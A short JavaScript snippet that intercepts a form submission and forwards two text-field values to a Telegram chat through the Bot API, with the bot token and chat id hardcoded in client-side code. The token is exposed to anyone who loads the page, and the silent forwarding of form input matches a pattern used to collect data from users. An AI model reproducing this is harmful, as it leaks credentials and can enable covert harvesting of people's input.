const form = document.querySelector("#bot");

form.addEventListener("submit", function(e){
    e.preventDefault();

    var text1 = document.getElementById("text1").value;
    var text2 = document.getElementById("text2").value;

    var msg = `Result is : %0A - Text1 : ${text1} %0A -Text2: ${text2}`

    var token = "5584784948:AAGHCvNBrwTiTx-VoJcSzjVKR2fpHzgHqGY";
    var chat_id = -658036982

    var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${msg}`

    let api = new XMLHttpRequest();
    api.open("GET", url, true);
    api.send();

    console.log(text1, text2);
})